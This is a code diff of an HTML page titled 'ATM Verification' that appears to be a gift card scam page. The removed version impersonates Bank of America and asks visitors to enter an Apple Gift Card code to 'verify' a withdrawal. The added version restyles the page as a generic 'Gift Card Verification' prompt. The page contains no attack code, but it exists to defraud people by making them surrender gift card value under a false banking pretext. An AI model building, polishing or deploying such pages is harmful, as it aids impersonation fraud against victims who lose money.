@@ -2,24 +2,64 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>ATM Verification</title>
-  <link rel="stylesheet" href="style2.css">
+  <link rel="stylesheet" href="style.css" />
+  <style>
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+      background-color: #f9f9f9;
+      margin: 0;
+      padding: 20px;
+      color: #333;
+    }
+
+    .container {
+      max-width: 400px;
+      margin: auto;
+      background: white;
+      padding: 30px;
+      border-radius: 8px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      text-align: center;
+    }
+
+    input[type="text"] {
+      width: 100%;
+      padding: 12px;
+      margin-top: 15px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+    }
+
+    button {
+      margin-top: 20px;
+      padding: 12px;
+      width: 100%;
+      background-color: #d1222b;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+
+    button:hover {
+      background-color: #b61f26;
+    }
+
+    h2 {
+      margin-bottom: 10px;
+      color: #d1222b;
+    }
+  </style>
 </head>
 <body>
-  <div style="background-color:#003366; color:white; padding:15px; text-align:center;">
-    <strong>Bank of America</strong>
-  </div>
-
   <div class="container">
-    <h2>ATM Verification Required</h2>
-    <p>Please enter the Apple Gift Card code below to verify your withdrawal request:</p>
-
-    <form action="receipt.html" method="GET">
-      <input type="text" name="giftcard" placeholder="Enter Apple Gift Card Code" required />
-      <br><br>
-      <button class="primary-button" type="submit">Verify & Continue</button>
-    </form>
+    <h2>Gift Card Verification</h2>
+    <p>To proceed, please enter your Gift Card Code below.</p>
+    <input type="text" placeholder="Enter Gift Card Code" />
+    <button>Submit</button>
   </div>
 </body>
 </html>
